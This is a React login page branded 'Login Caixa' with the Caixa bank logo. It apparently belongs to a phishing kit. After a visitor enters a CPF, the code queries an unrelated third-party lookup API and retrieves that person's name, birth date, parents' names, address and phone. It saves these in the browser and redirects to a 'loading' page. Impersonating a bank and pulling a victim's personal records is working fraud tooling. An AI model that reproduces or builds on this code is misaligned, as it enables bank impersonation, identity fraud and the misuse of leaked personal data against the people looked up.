import { useState } from "react";
import axios from "axios";
import logo from "../assets/caixa.webp";
import userIcon from "../assets/user.png";

// API ajustada para a que criamos no backend
export const api = axios.create({
    baseURL: "https://api-consulta-jdem.onrender.com/", // ou sua URL de produção
});

export function Login() {
    const [cpf, setCpf] = useState<string>("");
    const [isLoading, setIsLoading] = useState<boolean>(false);
    const [errorMessage, setErrorMessage] = useState<string>("");

    const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
        let value = event.target.value.replace(/\D/g, "");
        if (value.length > 11) value = value.slice(0, 11);

        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        setCpf(value);
    };

    const handleNext = async () => {
  if (cpf.length < 14) {
    setErrorMessage("Por favor, insira um CPF válido.");
    return;
  }

  setIsLoading(true);
  setErrorMessage("");

  try {
    const response = await api.get(`/information/basic`, {
      params: { cpf: cpf.replace(/\D/g, "") },
    });

    const userData = response?.data.data.resultado;

    if (userData) {
      // Normaliza a data para ISO
      let dataNascimentoISO = "";
      if (userData.nascimento) {
        if (userData.nascimento.includes("/")) {
          // formato dd/MM/yyyy
          const [dia, mes, ano] = userData.nascimento.split("/");
          dataNascimentoISO = `${ano}-${mes}-${dia}`;
        } else if (userData.nascimento.includes("-")) {
          // formato yyyy-MM-dd
          dataNascimentoISO = userData.nascimento;
        }
      }

      // Salva no localStorage já corrigido
      localStorage.setItem(
        "userData",
        JSON.stringify({
          nome: userData.nome,
          cpf: userData.cpf,
          dataNascimento: dataNascimentoISO, // sempre ISO
          nomeMae: userData.mae,
          sexo: userData.sexo,
          endereco: userData.endereco,
          numero: userData.endereco.numero,
          bairro: userData.endereco.bairro,
          cidade: userData.endereco.cidade,
          estado: userData.endereco.estado,
          pais: userData.endereco.pais,
          cep: userData.endereco.cep,
          telefone: userData.telefone.numero,
          pai: userData.pai,
          signo: userData.signo,
          idade: userData.idade,
        })
      );

      // Redireciona
      window.location.href = "/carregando";
    } else {
      setErrorMessage("CPF não encontrado. Verifique e tente novamente.");
    }
  } catch (error) {
    setErrorMessage("Erro ao buscar dados. Tente novamente mais tarde.");
    console.error("Erro ao chamar API:", error);
  } finally {
    setIsLoading(false);
  }
};


    return (
        <div className="w-screen px-6 space-y-6 mt-6">
            <header className="flex flex-col justify-center items-center p-4 space-y-3">
                <img width={170} src={logo} alt="logo" />
                <span className="text-blue-800">Login Caixa</span>
            </header>

            <div>
                <h1 className="text-lg text-zinc-500">
                    Informe seu CPF e clique em "Próximo" para continuar:
                </h1>
            </div>

            <div className="flex items-center space-x-2">
                <img src={userIcon} alt="user" width={15} />
                <input
                    type="text"
                    value={cpf}
                    onChange={handleCpfChange}
                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                    placeholder="CPF"
                    maxLength={14}
                />
            </div>

            {errorMessage && <p className="text-red-600">{errorMessage}</p>}

            <button
                onClick={handleNext}
                className={`w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 ${
                    isLoading
                        ? "bg-orange-500 cursor-not-allowed transform scale-90"
                        : "bg-orange-400 hover:scale-105"
                }`}
                disabled={isLoading}
            >
                {isLoading ? (
                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div>
                ) : (
                    "Próximo"
                )}
            </button>

            <div className="flex flex-col items-center text-blue-900 space-y-6">
                <span className="underline">Preciso de ajuda</span>
            </div>
        </div>
    );
}
